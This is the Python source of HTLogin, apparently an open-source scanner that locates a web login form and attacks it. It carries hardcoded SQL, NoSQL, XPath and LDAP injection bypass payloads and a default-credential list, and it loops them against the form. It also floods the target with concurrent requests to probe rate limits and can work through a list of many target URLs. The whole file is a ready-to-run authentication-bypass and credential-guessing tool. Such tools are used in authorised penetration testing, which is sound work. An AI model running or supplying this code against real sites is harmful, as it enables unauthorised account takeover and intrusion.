import argparse
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import json
import time
import concurrent.futures
import os
import sys
import io

INJECTION_PAYLOADS = {
    "SQL Injection": [
        "' OR '1'='1", "admin' --", "admin' #", "admin'/*",
        "' OR '1'='1' --", "' OR '1'='1' #", "' OR '1'='1'/*",
        "admin' OR '1'='1", "admin' OR '1'='1' --",
        "admin' OR '1'='1' #", "admin' OR '1'='1'/*"
    ],
    "NoSQL Injection": [
        '{"$ne": null}', '{"$gt": ""}', '{"$regex": ".*"}',
        '{"$in": [null, ""]}', '{"$exists": true}'
    ],
    "XPath Injection": [
        "' or '1'='1", "' or ''='", "' or 1]%00", "' or /* or '",
        "' or \"a\" or '", "' or 1 or '", "' or true() or '",
        "'or string-length(name(.))<10 or'", "'or contains(name,'adm') or'",
        "'or contains(.,'adm') or'", "'or position()=2 or'",
        "admin' or '", "admin' or '1'='2"
    ],
    "LDAP Injection": [
        "*", "*)(&", "*)(|(&", "pwd)", "*)(|(*", "*))%00",
        "admin)(&)", "pwd", "admin)(!(&(|", "pwd))", "admin))(|(|"
    ]
}

DEFAULT_CREDENTIALS = [
    "admin:admin", "admin:password", "admin:password1", "admin:password123",
    "admin:passw0rd", "admin:", "admin:12345", "administrator:password",
    "administrator:password1", "administrator:password123",
    "administrator:passw0rd", "administrator:", "administrator:12345"
]

def print_banner():
    banner = """
    ██   ██ ████████ ██       ██████   ██████  ██ ███    ██ 
    ██   ██    ██    ██      ██    ██ ██       ██ ████   ██ 
    ███████    ██    ██      ██    ██ ██   ███ ██ ██ ██  ██ 
    ██   ██    ██    ██      ██    ██ ██    ██ ██ ██  ██ ██ 
    ██   ██    ██    ███████  ██████   ██████  ██ ██   ████   v0.1 github.com/akinerkisa/HTLogin
    """
    print(banner)

def load_language_keywords(json_path, language_code):
    if not os.path.exists(json_path):
        print(f"languages.json file not found: {json_path}")
        sys.exit(1)
    
    try:
        with open(json_path, 'r', encoding='utf-8') as f:
            data = json.load(f)
    except json.JSONDecodeError as e:
        print(f"languages.json reading json error: {e}")
        sys.exit(1)
    except Exception as e:
        print(f"languages.json reading error: {e}")
        sys.exit(1)
    
    if language_code not in data:
        print(f"Not Supported Language: {language_code}. Supported Languages: {', '.join(data.keys())}")
        sys.exit(1)
    
    return data[language_code]

def check_login_success(response, original_url, original_content_length, success_keywords, failure_keywords):
    if response.status_code == 302:
        redirect_url = response.headers.get('Location')
        if redirect_url:
            full_redirect_url = urljoin(original_url, redirect_url)
            if full_redirect_url != original_url:
                try:
                    redirect_response = requests.get(full_redirect_url, cookies=response.cookies)
                except requests.RequestException:
                    return False

                if len(redirect_response.text) == original_content_length:
                    return False

                if 'login' not in redirect_response.url.lower() and 'login' not in redirect_response.text.lower():
                    return True

    if 'set-cookie' in response.headers:
        for cookie in response.cookies:
            if 'session' in cookie.name.lower():
                return True

    lower_content = response.text.lower()

    if any(keyword.lower() in lower_content for keyword in success_keywords) and \
       not any(keyword.lower() in lower_content for keyword in failure_keywords):
        return True

    return False

def test_default_credentials(session, url, username_input, password_input, csrf_input, action, credentials_list, verbose, success_keywords, failure_keywords):
    if verbose:
        print("\nTesting Default Credentials:")
    rate_limited_at = None
    for i, credential in enumerate(credentials_list, 1):
        if ':' not in credential:
            if verbose:
                print(f"Invalid credential format (skipping): {credential}")
            continue
        username, password = credential.split(':', 1)
        if verbose:
            print(f"Trying credential: {username}:{password}")

        payload_data = {
            username_input['name']: username,
            password_input['name']: password
        }

        if csrf_input:
            payload_data[csrf_input['name']] = csrf_input['value']

        try:
            response = session.post(action, data=payload_data, allow_redirects=False)
            if response.status_code in [403, 429] and rate_limited_at is None:
                if verbose:
                    print(f"Rate limit detected during default credential test. Status code: {response.status_code}")
                rate_limited_at = i

            login_result = check_login_success(response, url, len(requests.get(url).text), success_keywords, failure_keywords)

            if login_result:
                if verbose:
                    print(f"Default credential successful: {username}:{password}")
                    print(f"Response status code: {response.status_code}")
                    if response.status_code == 302:
                        print(f"Redirect location: {response.headers.get('Location')}")
                    print("Response content:")
                    print(response.text[:500])
                return True, rate_limited_at
            else:
                if verbose:
                    print(f"Trying credential: {username}:{password} - not successful")
        except requests.RequestException as e:
            if verbose:
                print(f"Error occurred while testing credential {username}:{password}: {e}")

    if verbose:
        print("No default credentials were successful.")
    return False, rate_limited_at

def test_rate_limit(url, num_requests, verbose):
    if verbose:
        print(f"\nTesting Rate Limit with {num_requests} requests:")
    session = requests.Session()
    rate_limited_at = None

    def make_request(i):
        try:
            response = session.get(url)
            if response.status_code in [403, 429]:
                return i, response.status_code
            return i, 200
        except requests.RequestException:
            return i, None

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        future_to_request = {executor.submit(make_request, i): i for i in range(num_requests)}
        for future in concurrent.futures.as_completed(future_to_request):
            i, status = future.result()
            if status in [403, 429] and rate_limited_at is None:
                rate_limited_at = i + 1
                if verbose:
                    print(f"Rate limit detected at request {rate_limited_at} with status code {status}")
            time.sleep(0.1)

    if rate_limited_at is None and verbose:
        print(f"No rate limit detected after {num_requests} requests. All requests returned status code 200.")

    return rate_limited_at

def find_and_test_login(url, custom_credentials, rate_limit_requests, verbose, language_keywords):
    try:
        session = requests.Session()
        response = session.get(url)
        response.raise_for_status()

        original_content_length = len(response.text)

        soup = BeautifulSoup(response.text, 'html.parser')

        form = soup.find('form')
        if not form:
            print("Login form not found.")
            return

        username_input = soup.find('input', {'type': 'text'}) or \
                         soup.find('input', {'type': 'email'}) or \
                         soup.find('input', {'name': 'username'}) or \
                         soup.find('input', {'type': 'username'})

        password_input = soup.find('input', {'type': 'password'})

        if not username_input or not password_input:
            print("Username or password input not found.")
            return

        print(f"Username input found: {username_input}")
        print(f"Password input found: {password_input}")

        csrf_input = soup.find('input', {'name': 'csrf'}) or \
                     soup.find('input', {'name': '_csrf'}) or \
                     soup.find('input', {'name': 'csrftoken'})

        if csrf_input:
            if verbose:
                print(f"CSRF token found: {csrf_input}")
        else:
            print("CSRF token not found. The form might be vulnerable to CSRF attacks.")

        action = form.get('action')
        if not action:
            action = url
        else:
            action = urljoin(url, action)

        results = {}

        success_keywords = language_keywords.get("success", [])
        failure_keywords = language_keywords.get("failure", [])

        for injection_type, payloads in INJECTION_PAYLOADS.items():
            if verbose:
                print(f"\nTesting {injection_type}:")
            rate_limited_at = None
            for i, payload in enumerate(payloads, 1):
                if verbose:
                    print(f"Trying payload: {payload}")

                payload_data = {
                    username_input['name']: payload,
                    password_input['name']: payload
                }

                if csrf_input:
                    payload_data[csrf_input['name']] = csrf_input['value']

                try:
                    if injection_type == "NoSQL Injection":
                        headers = {'Content-Type': 'application/json'}
                        response = session.post(action, data=json.dumps(payload_data), headers=headers, allow_redirects=False)
                    else:
                        response = session.post(action, data=payload_data, allow_redirects=False)

                    if response.status_code in [403, 429] and rate_limited_at is None:
                        if verbose:
                            print(f"Rate limit detected during {injection_type} test. Status code: {response.status_code}")
                        rate_limited_at = i

                    login_result = check_login_success(response, url, original_content_length, success_keywords, failure_keywords)

                    if login_result:
                        if verbose:
                            print(f"{injection_type} successful with payload: {payload}")
                            print(f"Response status code: {response.status_code}")
                            if response.status_code == 302:
                                print(f"Redirect location: {response.headers.get('Location')}")
                            print("Response content:")
                            print(response.text[:500])
                        results[injection_type] = f"Successful (Payload: {payload})"
                        break
                    else:
                        if verbose:
                            print(f"Trying payload: {payload} - not successful")
                except requests.RequestException as e:
                    if verbose:
                        print(f"Error occurred while testing {injection_type} with payload {payload}: {e}")

            if injection_type not in results:
                results[injection_type] = "Failed"
            if rate_limited_at:
                results[injection_type] += f" (Rate limited at payload {rate_limited_at})"

        credentials_list = custom_credentials if custom_credentials else DEFAULT_CREDENTIALS
        default_cred_success, default_cred_rate_limit = test_default_credentials(
            session, url, username_input, password_input, csrf_input, action, credentials_list, verbose, success_keywords, failure_keywords
        )

        if default_cred_success:
            results["Default Credentials"] = "Successful"
        else:
            results["Default Credentials"] = "Failed"
        if default_cred_rate_limit:
            results["Default Credentials"] += f" (Rate limited at attempt {default_cred_rate_limit})"

        rate_limit_result = test_rate_limit(url, rate_limit_requests, verbose)
        if rate_limit_result:
            results["Rate Limit Test"] = f"Rate limited at request {rate_limit_result}"
        else:
            results["Rate Limit Test"] = f"No rate limit detected after {rate_limit_requests} requests"

        print("\nSummary of results:")
        for test_type, result in results.items():
            print(f"{test_type}: {result}")

    except requests.RequestException as e:
        print(f"An error occurred: {e}")

def save_output(output, filename):
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(output)

def capture_output(func, *args, **kwargs):
    captured_output = io.StringIO()
    sys.stdout = captured_output
    func(*args, **kwargs)
    sys.stdout = sys.__stdout__
    return captured_output.getvalue()

def main():
    parser = argparse.ArgumentParser(description="Find and test login form for various vulnerabilities")
    parser.add_argument("-u", "--url", help="URL to inspect and test")
    parser.add_argument("-l", "--list", help="Path to file containing list of URLs")
    parser.add_argument("-cl", "--credential-list", help="Path to custom credential list file")
    parser.add_argument("-r", "--rate-limit", type=int, default=300, help="Number of requests for rate limiting test")
    parser.add_argument("-v", "--verbose", choices=['on', 'off'], default='off', help="Enable/disable verbose output (on/off)")
    parser.add_argument("-lang", "--language", default='en', help="Language code for keyword detection (default: en)")
    parser.add_argument("-o", "--output", nargs='?', const='output.txt', help="Save output to file")

    args = parser.parse_args()

    if args.url and args.list:
        print("Error: Both -u/--url and -l/--list parameters were provided.")
        print("Please use either -u/--url for a single URL or -l/--list for multiple URLs, not both.")
        sys.exit(1)

    if not args.url and not args.list:
        parser.error("Either -u/--url or -l/--list is required")

    print_banner()

    custom_credentials = None
    if args.credential_list:
        try:
            with open(args.credential_list, 'r', encoding='utf-8') as f:
                custom_credentials = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"Credential list file not found: {args.credential_list}")
            exit(1)
        except Exception as e:
            print(f"Error reading credential list file: {e}")
            exit(1)

    verbose_mode = args.verbose.lower() == 'on'
    selected_language = args.language.lower()

    script_dir = os.path.dirname(os.path.abspath(__file__))
    languages_json_path = os.path.join(script_dir, 'languages.json')

    language_keywords = load_language_keywords(languages_json_path, selected_language)

    output = ""

    if args.list:
        try:
            with open(args.list, 'r') as f:
                urls = [line.strip() for line in f if line.strip()]
            print(f"Total targets in list: {len(urls)}")
            output += f"Total targets in list: {len(urls)}\n"
            for i, url in enumerate(urls, 1):
                target_header = f"\nTarget {i}/{len(urls)}: {url}"
                print(target_header)
                output += f"{target_header}\n"
                result = capture_output(find_and_test_login, url, custom_credentials, args.rate_limit, verbose_mode, language_keywords)
                print(result)
                output += result + "\n"
        except FileNotFoundError:
            print(f"URL list file not found: {args.list}")
            exit(1)
        except Exception as e:
            print(f"Error reading URL list file: {e}")
            exit(1)
    elif args.url:
        target_header = f"Target: {args.url}"
        print(target_header)
        output += f"{target_header}\n"
        result = capture_output(find_and_test_login, args.url, custom_credentials, args.rate_limit, verbose_mode, language_keywords)
        print(result)
        output += result + "\n"

    if args.output:
        save_output(output, args.output)
        print(f"\nOutput saved to {args.output}")
      
if __name__ == "__main__":
    main()
